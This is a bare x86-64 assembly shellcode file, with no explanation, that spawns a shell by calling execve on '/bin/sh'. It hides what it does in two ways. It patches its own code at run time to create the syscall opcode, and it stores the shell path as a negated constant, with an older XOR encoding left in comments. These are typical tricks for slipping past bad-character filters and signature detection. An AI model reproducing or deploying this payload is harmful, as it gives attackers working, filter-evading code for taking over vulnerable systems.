BITS 64

global _start

section .text

_start:
        call $+5
        pop r12
        xor rcx, rcx
        mov cl, 0xf1
        neg cl
        mov BYTE [r12 + 0x29], cl
        xor rax, rax
        mov rdx, rax
        mov rsi, rax
        ;mov rdi, 0xdec5cdc0b0c4dcc0
        ;mov r15, 0xdeadbeefdeadbeef
        ;xor rsi, r15
        mov rdi, 0xFF978CD091969DD1
        neg rdi
        push rdi
        push rsp
        pop rdi
        mov al, 59
        syscall: db 0xff, 0x05

